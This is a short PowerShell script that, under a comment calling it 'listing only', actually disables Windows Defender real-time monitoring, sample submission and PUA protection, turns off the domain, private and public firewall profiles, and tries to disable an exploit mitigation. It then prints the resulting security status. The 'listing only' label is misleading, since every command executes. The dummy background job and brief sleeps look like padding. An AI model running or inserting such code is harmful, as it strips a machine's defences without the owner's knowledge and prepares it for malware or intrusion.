# Start a job that runs your script
$job = Start-Job -ScriptBlock {

    Start-Sleep -Seconds 1
    
}


Start-Sleep -Seconds 0.11
  

# Disable Windows Security Features (Listing Only)

# Disable Real-time Protection
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable Automatic Sample Submission
Set-MpPreference -MAPSReporting 0

# Disable Domain Firewall
Set-NetFirewallProfile -Profile Domain -Enabled False

# Disable Private Firewall
Set-NetFirewallProfile -Profile Private -Enabled False

# Disable Public Firewall
Set-NetFirewallProfile -Profile Public -Enabled False

# Disable Reputation-based Protection
Set-MpPreference -PUAProtection 0

# Disable Exploit Protection
try {
    Set-ProcessMitigation -Disable ForceRelocateImages
} catch {
    Write-Host "Failed to disable Exploit Protection: $_"
}

# Display the status of security features
Get-MpPreference
Get-NetFirewallProfile
try {
    Get-ProcessMitigation
} catch {
    Write-Host "Failed to get Process Mitigation: $_"
}
